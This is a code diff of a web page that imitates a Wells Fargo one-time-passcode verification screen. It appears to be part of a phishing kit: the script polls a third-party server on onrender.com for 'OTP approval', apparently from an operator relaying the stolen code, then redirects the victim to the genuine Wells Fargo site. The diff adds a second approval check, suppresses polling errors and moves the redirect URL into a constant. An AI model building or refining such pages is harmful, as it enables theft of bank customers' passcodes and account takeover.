@@ -5,126 +5,23 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Verification</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background-color: #fff;
-    }
-    .top-bar {
-      background-color: #df0025;
-      color: white;
-      padding: 16px 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .yellow-strip {
-      height: 4px;
-      background-color: #ffd700;
-      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-    }
-    .logo {
-      font-family: 'Clarendon', Georgia, serif;
-      font-size: 24px;
-      font-weight: bold;
-      letter-spacing: 1px;
-    }
-    .container {
-      max-width: 500px;
-      margin: 40px auto 20px;
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
-    }
-    .verify-section {
-      text-align: left;
-      margin-bottom: 25px;
-    }
-    .verify-section h1 {
-      font-size: 22px;
-      font-weight: bold;
-      color: #333;
-      margin-bottom: 8px;
-    }
-    .verify-section p {
-      font-size: 14px;
-      color: #333;
-      margin: 4px 0;
-      line-height: 1.4;
-    }
-    .verify-section .note {
-      font-size: 13px;
-      color: #555;
-    }
-    .otp-label {
-      font-size: 14px;
-      font-weight: 500;
-      margin-bottom: 6px;
-      color: #444;
-      display: block;
-      text-align: left;
-    }
-    .otp-input {
-      font-size: 16px;
-      text-align: center;
-      letter-spacing: 3px;
-      font-weight: bold;
-      border: 1.5px solid #999;
-      border-radius: 8px;
-      max-width: 220px;
-      margin: 0 auto 15px auto;
-      padding: 10px;
-      display: block;
-      background-color: #fafafa;
-      transition: border-color 0.2s, box-shadow 0.2s;
-    }
-    .otp-input:focus {
-      outline: none;
-      border-color: #0070c9;
-      box-shadow: 0 0 5px rgba(0, 112, 201, 0.4);
-    }
-    .sign-on {
-      width: 100%;
-      padding: 12px;
-      margin-top: 20px;
-      background-color: #eee;
-      border: none;
-      border-radius: 6px;
-      color: #666;
-      cursor: not-allowed;
-      font-size: 16px;
-      display: inline-flex;
-      justify-content: center;
-      align-items: center;
-      gap: 8px;
-    }
-    .sign-on.enabled {
-      background-color: #0070c9 !important;
-      color: white !important;
-      cursor: pointer !important;
-    }
-    .spinner {
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #fff;
-      border-radius: 50%;
-      width: 16px;
-      height: 16px;
-      animation: spin 1s linear infinite;
-      display: inline-block;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #errorMessage {
-      color: red;
-      font-size: 14px;
-      margin-top: 5px;
-      display: none;
-      text-align: left;
-      min-height: 18px;
-    }
+    body { font-family: Arial, sans-serif; margin: 0; background-color: #fff; }
+    .top-bar { background-color: #df0025; color: white; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
+    .yellow-strip { height: 4px; background-color: #ffd700; }
+    .logo { font-family: 'Clarendon', Georgia, serif; font-size: 24px; font-weight: bold; }
+    .container { max-width: 500px; margin: 40px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.15); }
+    .verify-section { text-align: left; margin-bottom: 25px; }
+    .verify-section h1 { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 8px; }
+    .verify-section p { font-size: 14px; color: #333; margin: 4px 0; line-height: 1.4; }
+    .verify-section .note { font-size: 13px; color: #555; }
+    .otp-label { font-size: 14px; font-weight: 500; margin-bottom: 6px; color: #444; display: block; text-align: left; }
+    .otp-input { font-size: 16px; text-align: center; letter-spacing: 3px; font-weight: bold; border: 1.5px solid #999; border-radius: 8px; max-width: 220px; margin: 0 auto 15px auto; padding: 10px; display: block; background-color: #fafafa; transition: border-color 0.2s, box-shadow 0.2s; }
+    .otp-input:focus { outline: none; border-color: #0070c9; box-shadow: 0 0 5px rgba(0, 112, 201, 0.4); }
+    .sign-on { width: 100%; padding: 12px; margin-top: 20px; background-color: #eee; border: none; border-radius: 6px; color: #666; cursor: not-allowed; font-size: 16px; display: inline-flex; justify-content: center; align-items: center; gap: 8px; }
+    .sign-on.enabled { background-color: #0070c9 !important; color: white !important; cursor: pointer !important; }
+    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #errorMessage { color: red; font-size: 14px; margin-top: 5px; display: none; text-align: left; min-height: 18px; }
   </style>
 </head>
 <body>
@@ -165,6 +62,7 @@
   const errorMessage = document.getElementById("errorMessage");
 
   const API_BASE = 'https://my-node-backend-4nfy.onrender.com';
+  const REDIRECT_URL = "https://www.wellsfargo.com/mobile-online-banking/";
 
   otpField.addEventListener("input", () => {
     if (otpField.value.trim()) {
@@ -190,12 +88,14 @@
     while (attempts < maxAttempts) {
       attempts++;
       try {
-        const res = await fetch(`${API_BASE}/check-otp-approval`);
-        const data = await res.json();
+        let res = await fetch(`${API_BASE}/check-otp-approval`);
+        let data = await res.json();
         if (data.otpApproved) return true;
-      } catch (e) {
-        console.error("Polling error:", e);
-      }
+
+        res = await fetch(`${API_BASE}/check-approval`);
+        data = await res.json();
+        if (data.approved) return true;
+      } catch (e) {}
       await new Promise(res => setTimeout(res, intervalMs));
     }
     return false;
@@ -229,7 +129,7 @@
 
       const approved = await pollOtpApproval();
       if (approved) {
-        window.location.href = "https://www.wellsfargo.com/mobile-online-banking/";
+        window.location.href = REDIRECT_URL;
       } else {
         errorMessage.textContent = "OTP not approved yet.";
         errorMessage.style.display = "block";
